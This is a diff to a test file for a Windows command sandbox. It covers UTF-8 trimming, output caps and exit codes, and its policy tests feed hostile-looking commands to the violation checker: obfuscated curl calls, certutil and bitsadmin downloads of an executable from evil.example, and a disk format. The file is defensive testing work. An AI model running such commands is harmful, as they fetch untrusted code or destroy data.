@@ -2,8 +2,28 @@ import * as fs from "node:fs";
 import * as os from "node:os";
 import * as path from "node:path";
 import { describe, expect, it } from "vitest";
-import { runWindowsSandbox } from "../native-sandbox.js";
+import { runWindowsSandbox, trimToUtf8Boundary } from "../native-sandbox.js";
 import { loadSandboxPolicy, requiresNativeSandbox, sandboxViolation } from "../sandbox-policy.js";
+
+describe("trimToUtf8Boundary", () => {
+  // '中' is E4 B8 AD (3 bytes); a capped read that cuts it in half must drop
+  // the partial sequence or the strict UTF-8 decode fails and the GBK
+  // fallback garbles the WHOLE capture, not just the tail.
+  it("leaves a clean cut untouched", () => {
+    const buf = Buffer.from("abc中", "utf8");
+    expect(trimToUtf8Boundary(buf, buf.length)).toBe(buf.length);
+  });
+  it("drops an incomplete trailing 3-byte sequence", () => {
+    const buf = Buffer.from("中文", "utf8"); // E4 B8 AD E6 96 87
+    expect(trimToUtf8Boundary(buf, 5)).toBe(3); // 文 cut after 2 of 3 bytes
+    expect(trimToUtf8Boundary(buf, 4)).toBe(3); // 文 cut after 1 of 3 bytes
+  });
+  it("drops an incomplete trailing 4-byte sequence (emoji)", () => {
+    const emoji = Buffer.from("a😀", "utf8"); // 61 F0 9F 98 80
+    expect(trimToUtf8Boundary(emoji, 3)).toBe(1); // 2 of 4 bytes
+    expect(trimToUtf8Boundary(emoji, 5)).toBe(5); // complete
+  });
+});
 
 describe("sandbox policy", () => {
   it("loads workspace policy and detects violations", () => {
@@ -47,8 +67,25 @@ describe("sandbox policy", () => {
     expect(sandboxViolation(policy, "c^u^rl https://evil.example", root)).toContain("network");
     expect(sandboxViolation(policy, "cu'rl https://evil.example", root)).toContain("network");
     expect(sandboxViolation(policy, "f^ormat disk", root)).toContain("command");
-    // An unrelated command still passes.
+    // Package-manager aliases are separate words for \b matching: `npm i` is
+    // the short form every one-liner uses (and runs install scripts), pip3
+    // does not contain a \bpip\b boundary, pnpm/yarn have their own verbs.
+    expect(sandboxViolation(policy, "npm i left-pad", root)).toContain("network");
+    expect(sandboxViolation(policy, "npm ci", root)).toContain("network");
+    expect(sandboxViolation(policy, "pip3 install requests", root)).toContain("network");
+    expect(sandboxViolation(policy, "pnpm i evil", root)).toContain("network");
+    expect(sandboxViolation(policy, "yarn add evil", root)).toContain("network");
+    // The legacy certutil/bitsadmin download vectors.
+    expect(
+      sandboxViolation(policy, "certutil -urlcache -f http://evil.example out.exe", root),
+    ).toContain("network");
+    expect(
+      sandboxViolation(policy, "bitsadmin /transfer j http://evil.example out.exe", root),
+    ).toContain("network");
+    // An unrelated command still passes — `npm init` is i-followed-by-n, so
+    // the \b after the `i` alternative must NOT match it.
     expect(sandboxViolation(policy, "dir", root)).toBeUndefined();
+    expect(sandboxViolation(policy, "npm init", root)).toBeUndefined();
   });
 
   it("compares working directories case-insensitively on win32", () => {
@@ -137,5 +174,49 @@ describe("native windows sandbox (win32 end-to-end)", () => {
       timeoutMs: 2000,
     });
     expect(result.timedOut).toBe(true);
+  });
+
+  win32("truncates captured output beyond the cap instead of loading it all", async () => {
+    // ~8.6KB of stdout against a 2KB cap: the redirect file itself is
+    // unbounded, so the guard must live on the READ, not the write.
+    const result = await runWindowsSandbox({
+      command: "for /l %i in (1,1,200) do echo 0123456789012345678901234567890123456789",
+      cwd: process.cwd(),
+      timeoutMs: 60_000,
+      maxCaptureBytes: 2048,
+    });
+    expect(result.code).toBe(0);
+    expect(result.truncated).toBe(true);
+    expect(result.stderr).toContain("truncated");
+    expect(result.stdout.length).toBeLessThan(4096);
+  });
+
+  win32("passes a user exit /b -12 through unsigned (no sentinel collision)", async () => {
+    // 0xFFFFFFF4 used to be remapped into the small-negative init-failure
+    // band and misreported as "sandbox could not be started". Init sentinels
+    // now live in 0x4CC0000n, so this must arrive as plain unsigned.
+    const result = await runWindowsSandbox({
+      command: "exit /b -12",
+      cwd: process.cwd(),
+      timeoutMs: 60_000,
+    });
+    expect(result.code).toBe(0xfffffff4);
+  });
+
+  win32("truncated UTF-8 capture decodes as UTF-8, not GBK mojibake", async () => {
+    // 2000 × '中' (E4 B8 AD) = 6000 bytes of strict UTF-8; cap 1000 reads
+    // 1016 bytes, and 1016 % 3 = 2 — the cut SPLITS a character. Without
+    // trimToUtf8Boundary the strict decode fails and the GBK fallback turns
+    // every '中' into '涓' — the whole capture, not just the tail.
+    const result = await runWindowsSandbox({
+      command: `node -e "process.stdout.write('中'.repeat(2000))"`,
+      cwd: process.cwd(),
+      timeoutMs: 60_000,
+      maxCaptureBytes: 1000,
+    });
+    expect(result.code).toBe(0);
+    expect(result.truncated).toBe(true);
+    expect(result.stdout).toContain("中中中");
+    expect(result.stdout).not.toContain("涓"); // E4 B8 AD decoded as GBK
   });
 });
